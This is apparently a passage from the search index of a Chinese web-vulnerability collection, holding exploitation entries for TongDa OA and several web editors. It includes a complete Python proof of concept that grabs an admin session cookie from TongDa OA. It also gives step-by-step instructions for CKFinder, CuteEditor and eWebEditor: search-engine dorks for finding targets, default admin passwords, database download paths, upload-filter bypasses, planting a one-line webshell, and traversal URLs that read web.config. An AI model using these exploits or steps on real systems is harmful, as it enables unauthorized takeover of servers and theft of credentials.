\u66ff\u6362\u6d4f\u89c8\u5668Cookie\u4e2d\u7684SESSIONID\u5373\u53ef\u5b9e\u73b0\u767b\u5f55\u4e3aadmin","title":"\u901a\u8fbeOA2017\u524d\u53f0\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","text":"\u901a\u8fbeOA2017\u3001V11.X<V11.5","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","text":"''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() python3 poc.py -v \u7248\u672c -url url \u8fd0\u884c\u5e76\u83b7\u53d6\u5230\u53ef\u7528\u7684SESSIONID \u66ff\u6362\u6d4f\u89c8\u5668Cookie\u4e2d\u7684SESSIONID\u5373\u53ef\u5b9e\u73b0\u767b\u5f55\u4e3aadmin","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/CKfinder/CKfinder%201.4.3%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/","text":"CKFinder \u662f\u56fd\u5916\u4e00\u6b3e\u975e\u5e38\u6d41\u884c\u7684\u6240\u89c1\u5373\u6240\u5f97\u6587\u5b57\u7f16\u8f91\u5668,\u51761.4.3 asp.net\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u3002 CKFinder\u5728\u4e0a\u4f20\u6587\u4ef6\u7684\u65f6\u5019,\u5f3a\u5236\u5c06\u6587\u4ef6\u540d\uff08\u4e0d\u5305\u62ec\u540e\u7f00\uff09\u4e2d\u70b9\u53f7\u7b49\u5176\u4ed6\u5b57\u7b26\u8f6c\u4e3a\u4e0b\u5212\u7ebf_\uff0c\u4f46\u662f\u5728\u4fee\u6539\u6587\u4ef6\u540d\u65f6\u5374\u6ca1\u6709\u4efb\u4f55\u9650\u5236\uff0c\u4ece\u800c\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20 8090sec_php;1.jpg \u7b49\u7578\u5f62\u6587\u4ef6\u540d\uff0c\u6700\u7ec8\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 \u5982\u56fe\uff1a \u6ce8\u610f\u770b \u70b9\u88ab\u8fc7\u6ee4\u6389\u4e86 \u53d8\u6210\u4e86\u6a2a\u7ebf \u521a\u624d\u8bf4\u4e86 \u4e0a\u4f20\u6709\u8fc7\u6ee4\u4f46\u662f\u5728\u4fee\u6539\u6587\u4ef6\u540d\u65f6\u5374\u6ca1\u6709\u4efb\u4f55\u9650\u5236 \u63a5\u4e0b\u6765\u76f8\u4fe1\u4f60\u61c2\u7684..... \u200b","title":"CKfinder 1.4.3\u7f16\u8f91\u5668\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%20Asp.net%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","text":"Cute Editor Asp.Net\u7248\u5229\u7528iis\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97\u6743\u9650 \u00b6 \u5f71\u54cd\u7248\u672c\uff1a CuteEditor for ASP.NET\u4e2d\u6587\u7248\u8106\u5f31\u63cf\u8ff0\uff1a \u8106\u5f31\u63cf\u8ff0\uff1a CuteEditor\u5bf9\u4e0a\u4f20\u6587\u4ef6\u540d\u672a\u91cd\u547d\u540d\uff0c\u5bfc\u81f4\u5176\u53ef\u5229\u7528IIS\u6587\u4ef6\u540d\u89e3\u6790Bug\u83b7\u5f97webshell\u6743\u9650\u3002 \u653b\u51fb\u5229\u7528\uff1a \u53ef\u901a\u8fc7\u5728\u641c\u7d22\u5f15\u64ce\u4e2d\u952e\u5165\u5173\u952e\u5b57 inurl:Post.aspx?SmallClassID= \u6765\u627e\u5230\u6d4b\u8bd5\u76ee\u6807\u3002 \u5728\u7f16\u8f91\u5668\u4e2d\u70b9\u51fb\u201c\u591a\u5a92\u4f53\u63d2\u5165\u201d\uff0c\u4e0a\u4f20\u4e00\u4e2a\u540d\u4e3a\u201cxxx.asp;.avi\u201d\u7684\u7f51\u9a6c\uff0c\u4ee5\u6b64\u83b7\u5f97\u6743\u9650\u3002","title":"Cute editor Asp.net \u89e3\u6790\u6f0f\u6d1e\u5229\u7528"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%20Asp.net%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#cute-editor-aspnetiis","text":"\u5f71\u54cd\u7248\u672c\uff1a CuteEditor for ASP.NET\u4e2d\u6587\u7248\u8106\u5f31\u63cf\u8ff0\uff1a \u8106\u5f31\u63cf\u8ff0\uff1a CuteEditor\u5bf9\u4e0a\u4f20\u6587\u4ef6\u540d\u672a\u91cd\u547d\u540d\uff0c\u5bfc\u81f4\u5176\u53ef\u5229\u7528IIS\u6587\u4ef6\u540d\u89e3\u6790Bug\u83b7\u5f97webshell\u6743\u9650\u3002 \u653b\u51fb\u5229\u7528\uff1a \u53ef\u901a\u8fc7\u5728\u641c\u7d22\u5f15\u64ce\u4e2d\u952e\u5165\u5173\u952e\u5b57 inurl:Post.aspx?SmallClassID= \u6765\u627e\u5230\u6d4b\u8bd5\u76ee\u6807\u3002 \u5728\u7f16\u8f91\u5668\u4e2d\u70b9\u51fb\u201c\u591a\u5a92\u4f53\u63d2\u5165\u201d\uff0c\u4e0a\u4f20\u4e00\u4e2a\u540d\u4e3a\u201cxxx.asp;.avi\u201d\u7684\u7f51\u9a6c\uff0c\u4ee5\u6b64\u83b7\u5f97\u6743\u9650\u3002","title":"Cute Editor Asp.Net\u7248\u5229\u7528iis\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97\u6743\u9650"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","text":"Cute Editor\u5728\u7ebf\u7f16\u8f91\u5668\u672c\u5730\u5305\u542b\u6f0f\u6d1e \u00b6 \u5f71\u54cd\u7248\u672c: CuteEditor For Net 6.4 \u8106\u5f31\u63cf\u8ff0\uff1a \u53ef\u4ee5\u968f\u610f\u67e5\u770b\u7f51\u7ad9\u6587\u4ef6\u5185\u5bb9\uff0c\u5371\u5bb3\u8f83\u5927\u3002 \u653b\u51fb\u5229\u7528: http://navisec.it/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config","title":"Cute editor\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Cute%20editor/Cute%20editor%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#cute-editor","text":"\u5f71\u54cd\u7248\u672c: CuteEditor For Net 6.4 \u8106\u5f31\u63cf\u8ff0\uff1a \u53ef\u4ee5\u968f\u610f\u67e5\u770b\u7f51\u7ad9\u6587\u4ef6\u5185\u5bb9\uff0c\u5371\u5bb3\u8f83\u5927\u3002 \u653b\u51fb\u5229\u7528: http://navisec.it/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config","title":"Cute Editor\u5728\u7ebf\u7f16\u8f91\u5668\u672c\u5730\u5305\u542b\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"2.Ewebeditor\u7f16\u8f91\u5668 Ewebeditor\u662f\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u3001\u6240\u89c1\u5373\u6240\u5f97\u7684\u5728\u7ebfHTML\u7f16\u8f91\u5668\u3002\u5979\u80fd\u591f\u5728\u7f51\u9875\u4e0a\u5b9e\u73b0\u8bb8\u591a\u684c\u9762\u7f16\u8f91\u8f6f\u4ef6\uff08\u5982\uff1aWord\uff09\u6240\u5177\u6709\u7684\u5f3a\u5927\u53ef\u89c6\u7f16\u8f91\u529f\u80fd\u3002WEB\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u7528\u5979\u628a\u4f20\u7edf\u7684\u591a\u884c\u6587\u672c\u8f93\u5165\u6846 \u66ff\u6362\u4e3a\u53ef\u89c6\u5316\u7684\u5bcc\u6587\u672c\u8f93\u5165\u6846\uff0c\u4f7f\u6700\u7ec8\u7528\u6237\u53ef\u4ee5\u53ef\u89c6\u5316\u7684\u53d1\u5e03HTML\u683c\u5f0f\u7684\u7f51\u9875\u5185\u5bb9\u3002eWebEditor!\u5df2\u57fa\u672c\u6210\u4e3a\u7f51\u7ad9\u5185\u5bb9\u7ba1\u7406\u53d1\u5e03\u7684\u5fc5\u5907\u5de5\u5177\uff01 3.Ewebeditor\u5229\u7528\u6838\u5fc3 \u5982\u4f55\u53d1\u73b0\u7f16\u8f91\u5668\u5730\u5740 Ewebeditor\uff1a \u9ed8\u8ba4\u540e\u53f0\uff1aewebeditor/admin_login.asp \u9ed8\u8ba4\u6570\u636e\u5e93\uff1aewebeditor/db/ewebeditor.mdb \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\uff1aadmin admin/admin888 4.\u5229\u7528\u8fc7\u7a0b \u901a\u5e38\u5165\u4fb5ewebeditor\u7f16\u8f91\u5668\u7684\u6b65\u9aa4\u5982\u4e0b: 1\u3001\u9996\u5148\u8bbf\u95ee\u9ed8\u8ba4\u7ba1\u7406\u9875\u770b\u662f\u5426\u5b58\u5728 \u200b \u9ed8\u8ba4\u7ba1\u7406\u9875\u5730\u57402.80\u4ee5\u524d\u4e3a ewebeditor/admin_login.asp \u4ee5\u540e\u7248\u672c\u4e3aadmin/login.asp(\u5176\u4ed6\u8bed\u8a00\u6539\u540e\u6233,\u8fd9\u91cc\u4ee5asp\u4e3a\u4f8b) \u3002 2\u3001\u9ed8\u8ba4\u7ba1\u7406\u5e10\u53f7\u5bc6\u7801 \u200b \u9ed8\u8ba4\u7ba1\u7406\u9875\u5b58\u5728\uff01\u6211\u4eec\u5c31\u7528\u5e10\u53f7\u5bc6\u7801\u767b\u9646\uff01\u9ed8\u8ba4\u5e10\u53f7\u5bc6\u7801\u4e3a: admin admin888 \uff01\u5e38\u7528\u7684\u5bc6\u7801\u8fd8\u6709admin admin999 admin1 admin000 \u4e4b\u7c7b\u7684\u3002 3\u3001\u9ed8\u8ba4\u6570\u636e\u5e93\u5730\u5740 \u200b \u5982\u679c\u5bc6\u7801\u4e0d\u662f\u9ed8\u8ba4\u7684\u3002\u6211\u4eec\u8bbf\u95ee\u7684\u5c31\u4e0d\u662f\u9ed8\u8ba4\u6570\u636e\u5e93\uff01\u5c1d\u8bd5\u4e0b\u8f7d\u6570\u636e\u5e93\u5f97\u5230\u7ba1\u7406\u5458\u5bc6\u7801\uff01\u7ba1\u7406\u5458\u7684\u5e10\u53f7\u5bc6\u7801\uff0c\u90fd\u5728eWebEditor_System\u8868\u6bb5\u91cc\uff0csys_UserName Sys_UserPass \u90fd\u662fmd5\u52a0\u5bc6\u7684\u3002\u5f97\u5230\u4e86\u52a0\u5bc6\u5bc6\u7801\u3002\u53ef\u4ee5\u53bbwww.cmd5.com www.xmd5.org \u7b49\u7f51\u7ad9\u8fdb\u884c\u67e5\u8be2\uff01\u66b4\u529b\u8fd9\u6d3b\u597d\u4e45\u4e0d\u5e72\u4e86\uff01\u4e5f\u53ef\u4ee5\u4e22\u56fd\u5916\u4e00\u4e9b\u53ef\u4ee5\u8dd1\u5bc6\u7801\u7684\u7f51\u7ad9\u53bb\u8dd1! \u9ed8\u8ba4\u6570\u636e\u5e93\u8def\u5f84\u4e3a:ewebeditor/db/ewebeditor.mdb \u5e38\u7528\u6570\u636e\u5e93\u8def\u5f84\u4e3a: ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asp ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb \u7b49\u7b49\u3002 \u200b \u5f88\u591a\u7ba1\u7406\u5458\u5e38\u6539.asp\u540e\u7f00\uff0c\u4e00\u822c\u8bbf\u95ee.asp .asa \u540e\u7f00\u7684\u90fd\u662f\u4e71\u7801\uff01\u53ef\u4ee5\u7528\u4e0b\u8f7d\u5de5\u5177\u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u66f4\u6539\u540e\u7f00\u4e3a.mdb\u6765\u67e5\u770b\u5185\u5bb9\uff01 4\u3001\u6f0f\u6d1e\u57fa\u672c\u5229\u7528\u6b65\u9aa4\uff0c\u4ee5asp\u4e3a\u4f8b\uff01 1\uff09 \u767b\u9646\u540e\u53f0\u4ee5\u540e\u3002\u9009\u62e9\u6837\u5f0f\u7ba1\u7406\uff0c\u9ed8\u8ba4\u7f16\u8f91\u5668\u7684\u9ed8\u8ba4\u6837\u5f0f\u90fd\u4e0d\u53ef\u4ee5\u4fee\u6539\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u4ece\u4efb\u610f\u6837\u5f0f\u65b0\u5efa\u4e00\u4e2a\u6837\u5f0f\uff0c\u7136\u540e\u5728\u56fe\u7247\u4e0a\u4f20\u6dfb\u52a0\u53ef\u4e0a\u4f20\u540e\u7f00\u3002.asa .cer .cdx \u7b49\uff01.asp \u8fc7\u6ee4\u8fc7\u4e86\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528.aaspsp\u540e\u7f00\u6765\u6dfb\u52a0\uff0c\u8fd9\u6837\u4e0a\u4f20\u6587\u4ef6\u6b63\u597d\u88abewebeditor \u5403\u6389asp\u540e\u7f00\uff0c\u5269\u4e0b.asp \u3002\u540c\u6837\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e2a\u7ba1\u7406\u5458\u6709\u5b89\u5168\u610f\u8bc6\u7684\uff0c\u4ece\u4ee3\u7801\u91cc\uff0c\u628a.asp .asa .cer .cdx \u90fd\u5b8c\u5168\u7981\u6b62\u4e86\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528.asasaa \u540e\u7f00\u6765\u7a81\u7834\u3002\u6dfb\u52a0\u5b8c\u4e86\u540e\u7f00\uff0c\u53ef\u4ee5\u5728\u6837\u5f0f\u7ba1\u7406\uff0c\u70b9\u51fb\u9884\u89c8\uff0c\u7136\u540e\u4e0a\u4f20\uff01 asa|cer|asp|aaspsp Asa cer \u5b83\u53ef\u4ee5\u5728iis6.0\u5e73\u53f0\u89e3\u6790\u4e3aasp\u6267\u884c Aaspsp\uff1a\u7ed5\u8fc7\u8fc7\u6ee4 \u8fc7\u6ee4asp aaspsp=\u300basp \u6ce8\u610f\uff1a\u4f4e\u7248\u672cewebeditor\u4e0d\u652f\u6301ie7.0\u4ee5\u4e0b\u7248\u672c\u8bbf\u95ee\uff08ietest\u8f6f\u4ef6\u6a21\u62dfie6.0\u4e0a\u4f20\uff09 \u4ee5\u4e0b\u4ee52.1.6\u8fd9\u4e2a\u7248\u672c\u4e3a\u4f8b\u6765\u6f14\u793a: \u70b9\u51fb\u6837\u5f0f\u7ba1\u7406,\u7136\u540e\u65b0\u589e\u6837\u5f0f \u5728\u56fe\u7247\u7c7b\u578b\u4e2d\u52a0\u5165\u4ee5\u4e0b\u7c7b\u578b:asa|cer|asp|aaspsp \u7136\u540e\u70b9\u51fb\u63d0\u4ea4\u3002 \u7136\u540e\u5728\u5de5\u5177\u680f\u91cc\u65b0\u589e\u5de5\u5177 \u5728\u6309\u94ae\u8bbe\u7f6e\u91cc\u65b0\u589e\"\u63d2\u5165\u6216\u4fee\u6539\u56fe\u7247\" \u7136\u540e\u70b9\u51fb\u4fdd\u5b58\u8bbe\u7f6e\u3002\u7136\u540e\u518d\u56de\u53bb\u70b9\u51fb\u9884\u89c8\u3002 \u63a7\u4ef6\u6548\u679c\u5c31\u51fa\u6765\u4e86\u3002\u7136\u540e\u76f4\u63a5\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c \u70b9\u51fb\u786e\u5b9a\uff0c\u4e0a\u4f20\u6210\u529f\uff0c\u4e4b\u540e\uff0c\u67e5\u770b\u4ee3\u7801\uff0c\u5c31\u80fd\u770b\u5230\u5b8c\u6574\u7684\u5730\u5740 \u7528\u83dc\u5200\u4e00\u8fde\u5c31\u80fd\u5c31OK\u4e86\u3002\u3002\u3002","title":"Eweb\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E5%89%8D%E6%94%BB%E5%87%BB%E7%97%95%E8%BF%B9%E6%9F%A5%E7%9C%8B/","text":"\u5bfb\u627e\u524d\u4eba\u75d5\u8ff9\u518d\u6b21\u5165\u4fb5 \u6709\u65f6\u5019\u7528\u6237\u540d\u4e0e\u5bc6\u7801\u5f97\u7b49\u4e0d\u8fdb\u53bb\uff0c\u4f46\u662f\u6570\u636e\u5e93\u53ef\u4ee5\u4e0b\u8f7d\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u770b\u4e0b\u662f\u5426\u6709\u524d\u4eba\u5165\u4fb5\u8fc7\uff0c\u5982\u679c\u6709\u4eba\u5165\u4fb5\u8fc7\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u5165\u7a81\u7834\u3002 \u5982\u4f55\u5224\u65ad\u6709\u524d\u4eba\u5165\u4fb5\u8fc7\u4e86??\u4e0b\u8f7d\u597d\u6570\u636e\u5e93\u4e4b\u540e\u67e5\u770b\u4ed6\u7684eWebEditor_style\u8868\u4e2d\u7684S_ImageExt\u5b57\u6bb5\u662f\u5426\u6709\u88ab\u4eba\u6dfb\u52a0\u8fc7\u4ec0\u4e48\u3002 \u4f7f\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u8fdb\u5165\u7a81\u7834: ewebeditor.asp?ID=xx & style=yy \u5176\u4e2d\u7684id=xx\u5c31\u662f\u88ab\u4fee\u6539\u8fc7\u7684\u90a3\u6761\u8bb0\u5f55\u7684id\uff0c\u800cyy\u5c31\u662fS_name\u5b57\u6bb5\u7684\u540d\u5b57\u3002 \u4f8b\u5982\u8fd9\u91cc\u5c31\u4fee\u6539\u6210: ewebeditor.asp?ID=54&style=testckse \u53bb\u8bbf\u95ee \u56fe\u7247\u63a7\u4ef6\u5c31\u51fa\u6765\u4e86\u3002\u3002","title":"Eweb\u7f16\u8f91\u5668\u524d\u653b\u51fb\u75d5\u8ff9\u67e5\u770b"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/EWeb%20editor/Eweb%E7%BC%96%E8%BE%91%E5%99%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","text":"2\uff09\u76ee\u5f55\u904d\u5386 \u70b9\u51fb\"\u4e0a\u4f20\u6587\u4ef6\u7ba1\u7406\" \u7136\u540e\u9009\u62e9\u6837\u5f0f\u76ee\u5f55\u3002 \u5728id=14\u540e\u9762\u52a0\u4e0a&dir=../ http://192.168.87.129:8123/admin_uploadfile.asp?id=14 & dir=../ \u53d1\u73b0\u6ca1\u6709\u8d77\u4f5c\u7528\uff0c\u90a3\u5c31\u662f2.1.6\u8fd9\u4e2a\u7248\u672c\u4e0d\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u3002\u6362\u62102.8.0\u30022.8.0\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e \u80fd\u904d\u5386\u76ee\u5f55\u3002","title":"Eweb\u7f16\u8f91\u5668\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e"},{"location":"02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/FCKeditor/FCKeditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%9D%80/","text":"FCKeditor\u7f16\u8f91\u5668\u6e17\u900f\u601d\u8def \u00b6 